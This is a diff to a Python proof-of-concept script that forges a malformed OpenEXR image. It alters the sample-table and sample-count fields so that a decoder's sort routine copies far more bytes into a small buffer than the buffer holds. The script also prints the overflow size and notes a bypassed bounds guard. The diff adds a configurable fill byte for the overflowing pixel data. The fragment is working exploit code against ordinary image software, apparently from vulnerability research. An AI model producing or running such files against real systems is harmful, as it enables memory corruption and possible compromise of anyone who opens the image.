@@ -16,6 +16,7 @@ BASE = sys.argv[1] if len(sys.argv) > 1 else "baseline.exr"
 OUT = sys.argv[2] if len(sys.argv) > 2 else "poc.exr"
 S = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
 U = int(sys.argv[4]) if len(sys.argv) > 4 else 64
+PIXEL = int(sys.argv[5], 0) if len(sys.argv) > 5 else 0x41
 
 data = open(BASE, "rb").read()
 
@@ -72,7 +73,7 @@ def shuffle4(b):
     return bytes(o)
 
 
-pixels = b"\x41" * U
+pixels = bytes([PIXEL]) * U
 inner = struct.pack("<Q", U) + shuffle4(pixels)
 with tempfile.NamedTemporaryFile(delete=False) as tf:
     tf.write(inner)
@@ -93,7 +94,7 @@ out = data[:otable_end] + chunk
 open(OUT, "wb").write(out)
 
 grid_total = S * 4
-print(f"poc: samptab={sampsize} (raw) packed={new_pk} unpacked={U}")
+print(f"poc: samptab={sampsize} (raw) packed={new_pk} unpacked={U} pixel=0x{PIXEL:02x}")
 print(f"forged totsamp={S} combSampSize=4 GRID_TOTAL={grid_total}")
 print(f"split=0 (all-float part) -> legacy split guard FALSE")
 print(f"sort2 would memcpy {grid_total} bytes into a {U}-byte buffer "
